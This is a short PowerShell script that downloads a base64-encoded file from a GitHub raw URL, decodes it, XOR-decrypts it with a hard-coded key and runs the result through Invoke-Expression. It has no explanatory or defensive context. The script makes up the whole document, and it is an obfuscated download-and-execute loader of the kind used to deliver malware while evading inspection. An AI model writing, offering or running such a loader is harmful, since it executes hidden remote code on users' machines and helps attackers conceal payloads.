$enc = [System.Text.Encoding]::UTF8
$EncodedText = (wget https://raw.githubusercontent.com/ferris-b/chicago/main/fix.txt).content
$test = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedText))
$key = "zachzachzach"
$bytes=([system.Text.Encoding]::UTF8.getBytes($test))
$newBytes = @();
for ($i = 0; $i -lt $bytes.Count; $i++) {
    $newBytes += $bytes[$i] -bxor $key[$i % $key.Length];
    }
([system.Text.Encoding]::UTF8.getString($newBytes)) | iex